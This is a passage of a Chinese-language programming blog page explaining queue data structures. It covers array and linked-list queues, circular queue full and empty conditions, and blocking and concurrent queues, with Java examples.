class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/%E9%98%9F%E5%88%97/1.jpg" alt="1"></p>
<p><img src="/2020/05/09/%E9%98%9F%E5%88%97/2.jpg" alt="2"></p>
<p>我们可以发现，进行几次入列出列的操作后，head和tail都会往后移动，那既然移动则无可避免地要到达数组的最大值，此时就要用到<strong>数据搬移</strong>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 入队操作，将item放入队尾</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// tail == n表示队列末尾没有空间了</span></span><br><span class="line">  <span class="keyword">if</span> (tail == n) &#123;</span><br><span class="line">    <span class="comment">// tail ==n &amp;&amp; head==0，表示整个队列都占满了</span></span><br><span class="line">    <span class="keyword">if</span> (head == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// 数据搬移</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = head; i &lt; tail; ++i) &#123;</span><br><span class="line">      items[i-head] = items[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 搬移完之后重新更新head和tail</span></span><br><span class="line">    tail -= head;</span><br><span class="line">    head = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  items[tail] = item;</span><br><span class="line">  ++tail;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="链式队列【链表实现】"><a href="#链式队列【链表实现】" class="headerlink" title="链式队列【链表实现】"></a>链式队列【链表实现】</h3><p>而链表的入列出列操作就有点类似于链表的增删：</p>
<p><img src="/2020/05/09/%E9%98%9F%E5%88%97/3.jpg" alt="3"></p>
<h2 id="其他分类"><a href="#其他分类" class="headerlink" title="其他分类"></a>其他分类</h2><h3 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h3><p><img src="/2020/05/09/%E9%98%9F%E5%88%97/%E5%BE%AA%E7%8E%AF%E5%88%97%E8%A1%A8.jpg" alt="循环列表"></p>
<p>对于循环列表来说，最重要的是确定<strong>队空条件</strong>和<strong>队满条件</strong>。</p>
<ul>
<li>队空条件：head==tail</li>
<li>队满条件：(tail+1)%n==head</li>
</ul>
<blockquote>
<p>队满条件之所以不直接使用“tail+1==head”是因为tail+1可能重新开始了一个循环。</p>
<p>例如tail=n-1【7】，而head=0</p>
</blockquote>
<p><strong>show you code：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CircularQueue</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 数组：items，数组大小：n</span></span><br><span class="line">  <span class="keyword">private</span> String[] items;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// head表示队头下标，tail表示队尾下标</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> head = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 申请一个大小为capacity的数组</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">CircularQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">    items = <span class="keyword">new</span> String[capacity];</span><br><span class="line">    n = capacity;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 入队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 队列满了</span></span><br><span class="line">    <span class="keyword">if</span> ((tail + <span class="number">1</span>) % n == head) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    items[tail] = item;</span><br><span class="line">    tail = (tail + <span class="number">1</span>) % n;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 出队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">dequeue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果head == tail 表示队列为空</span></span><br><span class="line">    <span class="keyword">if</span> (head == tail) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    String ret = items[head];</span><br><span class="line">    head = (head + <span class="number">1</span>) % n;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="阻塞队列"><a href="#阻塞队列" class="headerlink" title="阻塞队列"></a>阻塞队列</h3><p>队列空时，从头取数据会被阻塞，直到有了数据才会再取数据；队列满时，插入数据会被阻塞，直到有空闲位置才会再插入。</p>
<p>就像一个“<strong>生产者消费者模型</strong>”！</p>
<h3 id="并发队列"><a href="#并发队列" class="headerlink" title="并发队列"></a>并发队列</h3><p>指 线程安全的队列。</p>
<blockquote>
<p>最简单直接的实现方式是直接在 enqueue()、dequeue() 方法上加锁，但是锁粒度大并发度会比较低，同一时刻仅允许一个存或者取操作。实际上，基于数组的循环队列，利用 CAS 原子操作，可以实现非常高效的并发队列。这也是循环队列比链式队列应用更加广泛的原因。在实战篇讲 Disruptor 的时候，我会再详细讲并发队列的应用。</p>
</blockquote>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-chevron-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>